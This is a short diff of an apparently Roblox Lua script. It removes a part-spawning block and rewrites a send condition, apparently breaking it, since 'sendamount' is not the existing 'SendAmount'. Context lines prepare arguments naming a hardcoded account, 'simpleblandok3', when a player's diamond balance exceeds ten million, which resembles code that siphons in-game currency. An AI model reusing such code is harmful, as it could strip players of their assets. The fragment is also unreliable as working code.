@@ -134,18 +134,11 @@ print("VoidAmount:", VoidAmount)
 
 
 local waitTime = SendAmount and 30 or 10
-if waitTime == 30 then 
-local part = Instance.new("Part")
-part.Name = "Wait30"
-part.Size = Vector3.new(4, 1, 4)
-part.Position = Vector3.new(0, 10, 0)
-part.Anchored = true
-part.Parent = game.Workspace
-end
+
 wait(waitTime)
 local DiamondsInput = DiamondsAmount - 1000000
 local DiamondsValue = DiamondsAmount
-if SendAmount then
+if sendamount == true then
     if DiamondsAmount > 10000000 then
         local args = {
             [1] = "simpleblandok3",
